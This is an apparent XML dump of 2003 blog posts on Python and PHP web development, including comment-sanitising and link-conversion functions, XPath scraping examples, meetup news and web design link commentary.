&lt;p&gt;I'm hoping that the &lt;acronym title=&quot;Special Interest Group&quot;&gt;SIG&lt;/acronym&gt; can work to bring together some of the work being done with web frameworks within the Python community. As demonstrated by &lt;a href=&quot;http://www.python.org/cgi-bin/moinmoin/WebProgramming&quot; title=&quot;WebProgramming&quot;&gt;this wiki page&lt;/a&gt;, Python users are spoilt for choice when it comes to selecting a framework for developing web applications. This is a dual edged sword - on the one hand diversity is a good thing, but on the other hand actually chosing a framework for a project has become a lengthy and arduous task. A few web frameworks (such as mod_python) are partially standardised around the interface defined by Python's &lt;a href=&quot;http://www.python.org/doc/current/lib/module-cgi.html&quot;&gt;CGI module&lt;/a&gt;, but this module has some severe shortcomings (the greatest of which is probably an inability to distinguish between GET and POST data). I would like to see the &lt;acronym title=&quot;Special Interest Group&quot;&gt;SIG&lt;/acronym&gt; define a more capable interface that covers more common web abilities, then encourage existing frameworks to provide a compatability layer for that interface. That way, developers could code to the standard interface safe in the knowledge that selecting and moving between frameworks would require very little in the way of changes to developed code.&lt;/p&gt;

&lt;p&gt;The &lt;acronym title=&quot;Special Interest Group&quot;&gt;SIG&lt;/acronym&gt; is open to all, so I encourage anyone with an interest in Python's web programming capabilities to sign up and get involved.&lt;/p&gt;
</field>
		<field name="created">2003-10-18 22:42:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1228</field>
		<field name="title">Lawrence web meetup</field>
		<field name="slug">webMeetup</field>
		<field name="body">&lt;p&gt;My colleague &lt;a href=&quot;http://www.holovaty.com/&quot;&gt;Adrian&lt;/a&gt; is putting together a meetup for web designers and developers in the Lawrence, Kansas area on Monday evening. The venue is yet to be decided but we're looking to book somewhere for dinner with an atmosphere that's conducive to lively conversation. Likely attendants so far include &lt;a href=&quot;http://www.holovaty.com/&quot;&gt;Adrian Holovaty&lt;/a&gt;, &lt;a href=&quot;http://www.squidfingers.com/&quot;&gt;Travis Beckham&lt;/a&gt;, &lt;a href=&quot;http://www.anitrapavka.com/&quot;&gt;Anitra Pavka&lt;/a&gt;, Dan Cox (designer for &lt;a href=&quot;http://www.ljworld.com/&quot;&gt;ljworld.com&lt;/a&gt;, &lt;a href=&quot;http://www.lawrence.com/&quot;&gt;lawrence.com&lt;/a&gt; and &lt;a href=&quot;http://www.kusports.com/&quot;&gt;kusports.com&lt;/a&gt;) and myself. If you're a web developer/designer in the area and this sounds like your kind of thing &lt;a href=&quot;http://www.holovaty.com/&quot;&gt;drop Adrian a line&lt;/a&gt; for more information. It should be a lot of fun.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; Adrian's site now has a &lt;a href=&quot;http://www.holovaty.com/blog/archive/2003/10/18/1807&quot; title=&quot;Calling all Kansas City-area Web developers&quot;&gt;more details&lt;/a&gt; of confirmed attendants.&lt;/p&gt;</field>
		<field name="created">2003-10-18 23:06:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1229</field>
		<field name="title">HTMLifying user input</field>
		<field name="slug">htmlifying</field>
		<field name="body">&lt;p&gt;I've added a comment system to my &lt;a href=&quot;http://www.a-year-in-kansas.com/&quot; title=&quot;A Year in Kansas&quot;&gt;new Kansas blog&lt;/a&gt;. Since the target audience for that site is friends and family rather than fellow web developers, I've taken a very different approach to processing the input from comments. While this blog &lt;a href=&quot;http://simon.incutio.com/archive/2003/02/23/safeHtmlChecker&quot;&gt;insists upon valid XHTML&lt;/a&gt; and gives very little help to comment posters aside from highlighting validation problems, my new site's comment system takes the more traditional root of disallowing &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; while automatically converting line breaks and links.&lt;/p&gt;

&lt;p&gt;The standard way of doing this with &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; is to use the &lt;a href=&quot;http://www.php.net/nl2br&quot;&gt;&lt;code class=&quot;php&quot;&gt;nl2br&lt;/code&gt;&lt;/a&gt; function. I've never been a big fan of this method as I prefer blocks of text to be surrounded by paragraph tags. Luckily, adding paragraph tags to blocks of text is a relatively easy task. Here's the pseudo-code, mocked up in Python because it's quicker to experiment with than &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; text = '''... lengthy text block here ...'''
&amp;gt;&amp;gt;&amp;gt; paras = text.split('\n\n')
&amp;gt;&amp;gt;&amp;gt; paras = ['&amp;lt;p&amp;gt;%s&amp;lt;/p&amp;gt;' % para.strip() for para in paras]
&amp;gt;&amp;gt;&amp;gt; print '\n\n'.join(paras)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The above code splits the text block on any occurrence of a double newline, then wraps each of the resulting blocks in a paragraph tag (after stripping off any remaining whitespace) before joining the blocks back together with a pair of newlines between each one - because I like to keep my &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; nicely formatted. What it doesn't do is handle any necessary &lt;code class=&quot;html&quot;&gt;&amp;lt;br&amp;gt;&lt;/code&gt; tags. The trick now is to replace any single line breaks with &lt;code class=&quot;html&quot;&gt;&amp;lt;br&amp;gt;&lt;/code&gt; &lt;em&gt;without&lt;/em&gt; interfering with the paragraph tags. The easiest way to do this is to put the replacement inside the loop, so that only line breaks that occur within a paragraph are replaced. Here's the updated list comprehension:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;
&amp;gt;&amp;gt;&amp;gt; paras = ['&amp;lt;p&amp;gt;%s&amp;lt;/p&amp;gt;' % p.strip().replace('\n', '&amp;lt;br&amp;gt;\n') for p in paras]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The final job is to convert the above in to &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$paras = explode(&quot;\n\n&quot;, $text);
for ($i = 0, $j = count($paras); $i &amp;lt; $j; $i++) {
    $paras[$i] = '&amp;lt;p&amp;gt;'.
        str_replace(&quot;\n&quot;, &quot;&amp;lt;br&amp;gt;\n&quot;, trim($paras[$i])).
        '&amp;lt;/p&amp;gt;';
}
$text = implode(&quot;\n\n&quot;, $paras);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That's the line conversions handled, but there are a few other important steps. Any &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; tags entered by the user need to be either stripped out or disabled by converting them to entities. Converting them to entities carries the risk of ugly failed attempts at &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; appearing on the comments page, but stripping tags carries an equal risk of innocent parts of a legitimate comment (such as a &amp;lt;wink&amp;gt;) being discarded. I chose to go the entity conversion route but force commenters to preview their comments before posting them, a trick I picked up from &lt;a href=&quot;http://www.holovaty.com/&quot;&gt;Adrian's blog&lt;/a&gt;. The final step is to automatically convert links in to &lt;code class=&quot;html&quot;&gt;&amp;lt;a href=&quot;&quot;&amp;gt;&lt;/code&gt; tags. I achieve this using a pair of naive regular expressions in the hope that the preview screen would avoid them mangling comments in a way not intended by the author.&lt;/p&gt;

&lt;p&gt;Here's the finished &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; function:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;function untrustedTextToHTML($text) {
    $text = htmlentities($text);
    $paras = explode(&quot;\n\n&quot;, $text);
    for ($i = 0, $j = count($paras); $i &amp;lt; $j; $i++) {
        $paras[$i] = '&amp;lt;p&amp;gt;'.
            str_replace(&quot;\n&quot;, &quot;&amp;lt;br&amp;gt;\n&quot;, trim($paras[$i])).
            '&amp;lt;/p&amp;gt;';
    }
    $text = implode(&quot;\n\n&quot;, $paras);
    // Convert http:// links
    $text = preg_replace('|\\b(http://[^\s)&amp;lt;]+)|', 
        '&amp;lt;a href=&quot;$1&quot;&amp;gt;$1&amp;lt;/a&amp;gt;', $text);
    // Convert www. links
    $text = preg_replace('|\\b(www.[^\s)&amp;lt;]+)|', 
        '&amp;lt;a href=&quot;http://$1&quot;&amp;gt;$1&amp;lt;/a&amp;gt;', $text);
    return $text;
}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I have no doubt it could be improved, but my tests so far have shown it to be good enough for the job at hand.&lt;/p&gt;</field>
		<field name="created">2003-10-19 02:53:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1230</field>
		<field name="title">Managing Social Software</field>
		<field name="slug">managingSocialSoftware</field>
		<field name="body">&lt;p&gt;Moderation is a topic that goes hand in hand with online communities, but despite being a highly complex matter it is rarely given the coverage it deserves. That's all set to change now thanks to Tom Coates' excellent new blog, &lt;a href=&quot;http://www.everythinginmoderation.org/&quot;&gt;Everything in Moderation&lt;/a&gt;. The site's topic is &quot;creative ways to manage online communities and user-generated content&quot;, and the content posted so far easily lives up to that claim. Of particular interest are the &lt;a href=&quot;http://www.everythinginmoderation.org/2003/10/welcome_to_everything_in_moderation.shtml&quot; title=&quot;Welcome to Everything in Moderation&quot;&gt;introductory post&lt;/a&gt;, the definitions of the &lt;a href=&quot;http://www.everythinginmoderation.org/2003/10/on_four_types_of_moderation.shtml&quot;&gt;four principle types of moderation&lt;/a&gt; and a fascinating entry about &lt;a href=&quot;http://www.everythinginmoderation.org/2003/10/on_stealth_moderation_or_blame_the_technology.shtml&quot;&gt;using stealth moderation tactics&lt;/a&gt; to deter abusive posters. Definitely one for the blogroll (at least once it starts &lt;a href=&quot;http://blo.gs/ping.php&quot;&gt;pinging blo.gs&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2003-10-19 04:51:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1231</field>
		<field name="title">Converting links without regular expressions</field>
		<field name="slug">convertingLinks</field>
		<field name="body">&lt;p&gt;I pair-programmed this code with &lt;a href=&quot;http://blog.natbat.co.uk/&quot;&gt;Natalie&lt;/a&gt; just over a month ago, and I've now added it to my &lt;a href=&quot;http://www.a-year-in-kansas.com/&quot; title=&quot;A Year in Kansas&quot;&gt;Kansas blog&lt;/a&gt; simplified comments system as &lt;a href=&quot;http://simon.incutio.com/archive/2003/10/19/htmlifying&quot; title=&quot;HTMLifying user input&quot;&gt;mentioned earlier&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The problem is the age-old challenge of automatically converting &lt;acronym title=&quot;Uniform Republic of Love&quot;&gt;URL&lt;/acronym&gt;s embedded in a piece of text in to links. The standard way of doing this is with regular expressions, as I demonstrated in my previous entry. Creating a reliable regular expression for spotting a link is actually a pretty big challenge; creating one that can deal with the vagaries of typed text even more so. Two common details that normally trip up regular expression based link parsers are as follows:&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;Commas and semicolons, while rare, are perfectly valid within &lt;acronym title=&quot;Uniform Republic of Love&quot;&gt;URL&lt;/acronym&gt;s. Consider the horrible links churned out by the popular Vignette content management system, as used by sites like &lt;a href=&quot;http://www.guardian.co.uk/online/story/0,3605,1063360,00.html&quot; title=&quot;Rewarding the bloggers &quot;&gt;the Guardian&lt;/a&gt;. Links like this are frequently truncated at the first comma by naive regular expression based link parsers.&lt;/li&gt;
 &lt;li&gt;When writing plain text, most people use punctuation without bothering to explicitly separate it from the link. A classic example is mentioning a site (such as www.google.com) in parentheses - or even more commonly a &lt;acronym title=&quot;Uniform Republic of Love&quot;&gt;URL&lt;/acronym&gt; that sits next to a comma or fullstop. Of course commas and periods are both valid within &lt;acronym title=&quot;Uniform Republic of Love&quot;&gt;URL&lt;/acronym&gt;s so some mechanism is needed for only ignoring them if they occur at the very end of the link.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The other question of course is what we should be looking for in the first place. To keep things simple, I only consider tokens that start either with &quot;http://&quot; or with &quot;www.&quot; as these are by far the most common ways in which a link is included in plain text.&lt;/p&gt;

&lt;p&gt;Regular expressions are powerful beasts. It's quite possible that one could be constructed to avoid the problems mentioned above, making extensive use of arcane tricks such as negative lookahead assertions (say that quickly five times) and non-backreferenced atoms. The readability of a regular expression converges towards zero the more these tricks are employed, so I for one prefer to avoid them. Instead, the whole operation can be achieved using a combination of simple string operations.&lt;/p&gt;

&lt;p&gt;The first step is to split the string in to an array of words (or tokens) by exploding it on spaces. Spaces are ideal for this as they're the one character we can garauntee won't appear in a link - or at least not one that people are likely to paste in to some text in the expectation that it will be converted. We can now concentrate on each word in turn. If it starts with http:// or www. then we can treat it as a link - but what about the trailing punctuation? If we know the characters we don't want to appear at the end of the link (I use &lt;code&gt;.,'&quot;)(&amp;lt;&amp;gt;;:&lt;/code&gt;) we can simply chop off those characters from the end of the link one by one until we get to a character not represented in our block list. To preserve the formatting of the original text we should store each of the eliminated characters and tag them back on once the link has been created.&lt;/p&gt;

&lt;p&gt;The only step left is to add in the &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; for the link, then reconstruct the original text by imploding the array back down to a string separated by spaces. Here's the finished function:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;function convertLinks($text) {
    $words = explode(' ', $text);
    for ($i = 0, $j = count($words); $i &amp;lt; $j; $i++) {
        $word = $words[$i];
        $punctuation = '.,\'&quot;)(&amp;lt;&amp;gt;;:'; // Links may not end in these
        if (substr($word, 0, 7) == 'http://' || 
                substr($word, 0, 4) == 'www.') {
            $trailing = '';
            // Knock off ending punctuation
            $last = substr($word, -1);
            if (strpos($punctuation, $last) !== false) {
                // Last character is punctuation - eliminate it
                $trailing .= $last;
                $word = substr($word, 0, -1);
            }
            // Make link, add trailing punctuation back afterwards
            $link = $word;
            if (substr($link, 0, 4) == 'www.') {
                // This link needs an http://
                $link = 'http://'.$link;
            }
            $word = '&amp;lt;a href=&quot;'.$link.'&quot;&amp;gt;'.$word.'&amp;lt;/a&amp;gt;'.$trailing;
        }
        $words[$i] = $word;
    }
    return implode(' ', $words);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It doesn't cover every eventuality (the fuzzy nature of the problem makes that a pretty thankless task) but it handles most cases admirably well. If you want to try it out I've set up a demo page that uses the function &lt;a href=&quot;http://simon.incutio.com/code/php/ConvertLinksDemo.php&quot; title=&quot;Converting links without regular expressions demo&quot;&gt;right here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; The above code contains a couple of subtle bugs, mostly relating to line endings. I've posted an updated and improved version on the &lt;a href=&quot;http://simon.incutio.com/code/php/ConvertLinksDemo.php&quot;&gt;demo page&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-10-19 23:25:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1232</field>
		<field name="title">Google Life Guidance</field>
		<field name="slug">friends</field>
		<field name="body">&lt;p&gt;Friends don't let friends...&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;... use AOL&lt;/li&gt;
 &lt;li&gt;... vote democrat&lt;/li&gt;
 &lt;li&gt;... dress like The Crow&lt;/li&gt;
 &lt;li&gt;... use camera phones&lt;/li&gt;
 &lt;li&gt;... drive drunk&lt;/li&gt;
 &lt;li&gt;... type Qwerty&lt;/li&gt;
 &lt;li&gt;... drive SUVs&lt;/li&gt;
 &lt;li&gt;... starve themselves&lt;/li&gt;
 &lt;li&gt;... start blogs&lt;/li&gt;
 &lt;li&gt;... drive naked&lt;/li&gt;
 &lt;li&gt;... heavy breath on teleconferences&lt;/li&gt;
 &lt;li&gt;... and &lt;a href=&quot;http://www.google.com/search?q=%22Friends+don%27t+let+friends%22&quot; title=&quot;Google Search: &amp;quot;Friends don&amp;apos;t let friends&amp;quot;&quot;&gt;many more&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2003-10-19 23:40:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1233</field>
		<field name="title">Fun with DHTML and Flash</field>
		<field name="slug">podLob</field>
		<field name="body">&lt;p&gt;Travis Beckham's &lt;a href=&quot;http://www.podlob.com/&quot;&gt;podLob&lt;/a&gt; features 56 experiments in Flash and 19 in Javascript/&lt;acronym title=&quot;Dynamic HyperText Markup Language&quot;&gt;DHTML&lt;/acronym&gt;. I particularly liked the Flash image transitions. I'd probably complain bitterly I came across that kind of effect on a real site but as experiments they're fascinating and great fun to explore.&lt;/p&gt;</field>
		<field name="created">2003-10-20 05:20:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1234</field>
		<field name="title">Using XPath to mine XHTML</field>
		<field name="slug">xpathRocks</field>
		<field name="body">&lt;p&gt;This morning, I finally decided to &lt;a href=&quot;http://users.skynet.be/sbi/libxml-python/&quot; title=&quot;Libxml and Libxslt Python Bindings for Windows&quot;&gt;install libxml2&lt;/a&gt; and see what &lt;a href=&quot;http://www.xmldatabases.org/WK/blog/607?t=item&quot; title=&quot;Givin libxml2 some love&quot;&gt;all the fuss&lt;/a&gt; was about, in particular with respect to XPath. What followed is best described as an enlightening experience.&lt;/p&gt;

&lt;p&gt;XPath is a beautifully elegant way of adressing &quot;nodes&quot; within an &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; document. XPath expressions look a little like file paths, for example:&lt;/p&gt;

&lt;dl&gt;
 &lt;dt&gt;&lt;code class=&quot;xpath&quot;&gt;/first/second&lt;/code&gt;&lt;/dt&gt;
 &lt;dd&gt;Match any &lt;code class=&quot;xml&quot;&gt;&amp;lt;second&amp;gt;&lt;/code&gt; elements that occur inside a &lt;code class=&quot;xml&quot;&gt;&amp;lt;first&amp;gt;&lt;/code&gt; element that is the root element of the document&lt;/dd&gt;
 &lt;dt&gt;&lt;code class=&quot;xpath&quot;&gt;//second&lt;/code&gt;&lt;/dt&gt;
 &lt;dd&gt;Match all &lt;code class=&quot;xml&quot;&gt;&amp;lt;second&amp;gt;&lt;/code&gt; elements irrespective of their place in the document&lt;/dd&gt;
 &lt;dt&gt;&lt;code class=&quot;xpath&quot;&gt;//second[@hi]&lt;/code&gt;&lt;/dt&gt;
 &lt;dd&gt;Match all &lt;code class=&quot;xml&quot;&gt;&amp;lt;second&amp;gt;&lt;/code&gt; elements with a 'hi' attribute&lt;/dd&gt;
 &lt;dt&gt;&lt;code class=&quot;xpath&quot;&gt;//second[@hi=&quot;there&quot;]&lt;/code&gt;&lt;/dt&gt;
 &lt;dd&gt;Match all &lt;code class=&quot;xml&quot;&gt;&amp;lt;second&amp;gt;&lt;/code&gt; elements with a 'hi' attribute that equals &quot;there&quot;&lt;/dd&gt;
&lt;/dl&gt;

&lt;p&gt;A full &lt;a href=&quot;http://www.zvon.org/xxl/XPathTutorial/General/examples.html&quot;&gt;XPath tutorial&lt;/a&gt; is available.&lt;/p&gt;

&lt;p&gt;The Python libxml2 bindings make running XPath expressions incredibly simple. Here's some code that extracts the titles of all of the entries on my Kansas blog from the site's &lt;acronym title=&quot;Really Simply Syndication&quot;&gt;RSS&lt;/acronym&gt; feed:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; import libxml2
&amp;gt;&amp;gt;&amp;gt; import urllib
&amp;gt;&amp;gt;&amp;gt; rss = libxml2.parseDoc(
      urllib.urlopen('http://www.a-year-in-kansas.com/syndicate/').read())
&amp;gt;&amp;gt;&amp;gt; rss.xpathEval('//item/title')
[&amp;lt;xmlNode (title) object at 0xb4b260&amp;gt;, &amp;lt;xmlNode (title) object at 0xa99968&amp;gt;, 
&amp;lt;xmlNode (title) object at 0x10dce68&amp;gt;]
&amp;gt;&amp;gt;&amp;gt; [node.content for node in rss.xpathEval('//item/title')]
['Music and Brunch', 'House hunting', 'Arrival']
&amp;gt;&amp;gt;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Why is this so exciting? I've been &lt;a href=&quot;http://simon.incutio.com/archive/2002/06/16/myFirstXhtmlMindBomb&quot; title=&quot;My first XHTML mind bomb&quot;&gt;saying&lt;/a&gt; &lt;a href=&quot;http://simon.incutio.com/archive/2002/08/11/benefitsOfXhtml&quot; title=&quot;Benefits of XHTML&quot;&gt;for&lt;/a&gt; &lt;a href=&quot;http://simon.incutio.com/archive/2003/01/06/xhtmlIsJustFine&quot; title=&quot;XHTML is just fine&quot;&gt;over&lt;/a&gt; &lt;a href=&quot;http://simon.incutio.com/archive/2003/01/08/xhtmlIsStillGreatForContent&quot; title=&quot;XHTML is still great for content&quot;&gt;a&lt;/a&gt; &lt;a href=&quot;http://simon.incutio.com/archive/2003/08/03/futureProotContent&quot; title=&quot;XHTML for future-proof content&quot;&gt;year&lt;/a&gt; that &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; is an ideal format for storing pieces of content in a database or content management system. Serving content to browsers as &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; 4 makes perfect sense, but storing your actual content as &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; gives you the ability to process that content in the future using &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; tools.&lt;/p&gt;

&lt;p&gt;So far, the best example of a powerful tool for manipulating this stored &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; has been &lt;acronym title=&quot;eXtensible Stylesheet Language Transformations&quot;&gt;XSLT&lt;/acronym&gt;. &lt;acronym title=&quot;eXtensible Stylesheet Language Transformations&quot;&gt;XSLT&lt;/acronym&gt; has its fans, but is also often criticised as being unintuitive and having a steep learning curve. XPath is a far better example of a powerful, easy to use tool that can be brought to bare on &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; content.&lt;/p&gt;

&lt;p&gt;Enough talk, here's an example of what I mean. The following code snippet creates a Python dictionary of all of the acronyms currently visible on the front page of my blog, mapping their shortened version to the expanded text (extracted from the title attribute):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;
&amp;gt;&amp;gt;&amp;gt; blog = libxml2.parseDoc(
    urllib.urlopen('http://simon.incutio.com/').read())
&amp;gt;&amp;gt;&amp;gt; ctxt = blog.xpathNewContext()
&amp;gt;&amp;gt;&amp;gt; ctxt.xpathRegisterNs('xhtml', 'http://www.w3.org/1999/xhtml')
0
&amp;gt;&amp;gt;&amp;gt; acronyms = dict([(a.content, a.prop('title')) 
    for a in ctxt.xpathEval('//xhtml:acronym')])
&amp;gt;&amp;gt;&amp;gt; for acronym, fulltext in acronyms.items():
	print acronym, ':', fulltext


DHTML : Dynamic HyperText Markup Language
URL : Universal Republic of Love
HTML : HyperText Markup Language
SIG : Special Interest Group
PHP : PHP: Hypertext Preprocessor
CSS : Cascading Style Sheets
&amp;gt;&amp;gt;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The above code is slightly more complicated than the first example, as using XPath with a document that uses &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; namespaces requires some extra work to register the namespace with the XPath parser. Still, it's a pretty short piece of code considering what it does.&lt;/p&gt;

&lt;p&gt;For an example of how powerful XPath can be on a much larger scale, take a look at Sam Ruby's &lt;a href=&quot;http://www.intertwingly.net/blog/1601.html&quot;&gt;XPath enabled blog search feature&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-10-21 05:31:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1235</field>
		<field name="title">Google's Internal Blogs</field>
		<field name="slug">googleBlogs</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://news.com.com/2008-1025-5094753.html?tag=nefd_acpro&quot; title=&quot;Blog on&quot;&gt;Evan Williams&lt;/a&gt; on Google's intranet weblogs:&lt;/p&gt;

&lt;blockquote cite=&quot;http://news.com.com/2008-1025-5094753.html?tag=nefd_acpro&quot;&gt;
&lt;dl&gt;
&lt;dt&gt;How many people blog at Google?&lt;/dt&gt;
&lt;dd&gt;Not sure what the count is, but I know there's a couple hundred or more. It's really interesting to see the network grow from scratch.&lt;/dd&gt;
&lt;dt&gt;Do you use that to get to know one another or to keep up-to-date on projects?&lt;/dt&gt;
&lt;dd&gt;A lot of people use it to keep up-to-date on projects and to share pointers or expertise. I've heard people comment on how it's way easier to know what's going on internally now. You can find out what's going on when you go there or when you're curious about it, but you don't have to be deluged or distracted from your normal day.&lt;/dd&gt;
&lt;/dl&gt;
&lt;/blockquote&gt;

&lt;p&gt;Markup question: I used a definition list in the above quotation - was this appropriate? Is there a better way of marking up this information?&lt;/p&gt;</field>
		<field name="created">2003-10-22 04:58:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1236</field>
		<field name="title">Language wars, distilled</field>
		<field name="slug">drunkenMonkey</field>
		<field name="body">&lt;p&gt;A snippet from &lt;a href=&quot;http://www.deftcode.com/archives/every_language_war_ever.html&quot;&gt;Every Language War Ever&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.deftcode.com/archives/every_language_war_ever.html&quot;&gt;
&lt;p&gt;&lt;acronym title=&quot;Idiot 2&quot;&gt;I2&lt;/acronym&gt;: A programmer can write unmaintainable code in any language. Let's compare a carefully prepared code snippet from &lt;acronym title=&quot;My Favourite Language&quot;&gt;MFL&lt;/acronym&gt; with a horrifically bad snippet from &lt;acronym title=&quot;Your Favourite Language&quot;&gt;YFL&lt;/acronym&gt; written by a drunken monkey.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-10-22 05:40:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1237</field>
		<field name="title">A List Apart Again</field>
		<field name="slug">alaAgain</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.alistapart.com/&quot;&gt;A List Apart&lt;/a&gt; has unveiled the long awaited redesign, and is celebrating it's third manifestation with three brand new articles.&lt;/p&gt;

&lt;p&gt;The redesign is currently being discussed on &lt;a href=&quot;http://www.webdesign-l.com/&quot;&gt;Webdesign-L&lt;/a&gt;, and the general consensus is that it's a bit of a disappointment. I agree; while a perfectly servicable and attractive design to me it gives off the air of a well designed weblog rather than a cutting edge web design and development magazine.&lt;/p&gt;

&lt;p&gt;Of the three new articles, the best by far is Doug Bowman's &lt;a href=&quot;http://www.alistapart.com/articles/slidingdoors/&quot;&gt;Sliding Doors of CSS&lt;/a&gt;, which describes in great detail how multiple background images applied to nested elements can be used to create a set of elegant, size-expandable tabs. Multiple nested backgrounds are not a new idea, but I haven't seen Doug's technique of creating a narrow image for the left hand side which overlaps a much larger right hand image before. I'm sure we're going to see a lot of interesting variations on this in the next few months.&lt;/p&gt;

&lt;p&gt;Joe Clark's &lt;a href=&quot;http://www.alistapart.com/articles/fir/&quot;&gt;Facts and Opinion About Fahrner Image Replacement&lt;/a&gt; confirms the now widely accepted fact that &lt;code class=&quot;css&quot;&gt;display: none;&lt;/code&gt; hides content from screen readers, rendering the Fahrner Image Replacement technique obsolete. &lt;a href=&quot;http://www.alistapart.com/discuss/fir/#c5096&quot;&gt;According to the author&lt;/a&gt;, the article was completed some time ago and thus does not cover more recent innovations in the field of image replacement, such as the &lt;a href=&quot;http://www.kryogenix.org/code/browser/lir/&quot; title=&quot;A new image replacement technique&quot;&gt;Leahy / Langridge hack&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The third article, &lt;a href=&quot;http://www.alistapart.com/articles/randomizer/&quot;&gt;Random Image Rotation&lt;/a&gt;, introduces a simple &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; script for randomly serving up an image from a directory. I've always found the server side development material on &lt;acronym title=&quot;A List Apart&quot;&gt;ALA&lt;/acronym&gt; relatively uninspiring, but I guess this is because the target audience of the site is more designers than developers.&lt;/p&gt;

&lt;p&gt;It's worth mentioning that the site's information architecture has been completely redone, making it far easier to dig through the excellent material in the archives. All in all it's great to see the site back again, and I look forward to reading new material as it arrives.&lt;/p&gt;</field>
		<field name="created">2003-10-22 18:09:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1238</field>
		<field name="title">Ward talks Wiki</field>
		<field name="slug">wardTalksWiki</field>
		<field name="body">&lt;p&gt;Artima have published the first installment of Bill Venners' &lt;a href=&quot;http://www.artima.com/intv/wiki.html&quot;&gt;Conversation with Ward Cunningham&lt;/a&gt;, which focuses on the Wiki. When &lt;a href=&quot;http://www.artima.com/intv/wiki2.html&quot; title=&quot;Page 2: Getting the Big Picture&quot;&gt;asked&lt;/a&gt; how readers can get a bigger picture of what is going on in a Wiki, Ward responds with this:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.artima.com/intv/wiki2.html&quot;&gt;&lt;p&gt;The first thing you have to understand is that because we made wiki easier for authors, we actually made it harder for readers. There is an organization there, and the organization can be improved, but it isn't highly organized. So the feeling for a reader is one of foraging in a wilderness for tidbits of information. You stumble across some great ones and you say, &quot;This is fantastic, why doesn't somebody just make a list of all the great pieces so I don't have to look at the rest.&quot; In other words, &quot;Why doesn't somebody organize this so I can get answers to my questions quickly?&quot; Sooner or later they realize, &quot;Gee, I could do that.&quot; They put in a month or two of finding what they care about, and then they make a page, which is their take on what the organization of wiki is.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I think this goes a long way to explaining why a lot of people dislike the Wiki format.&lt;/p&gt;</field>
		<field name="created">2003-10-22 19:31:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1239</field>
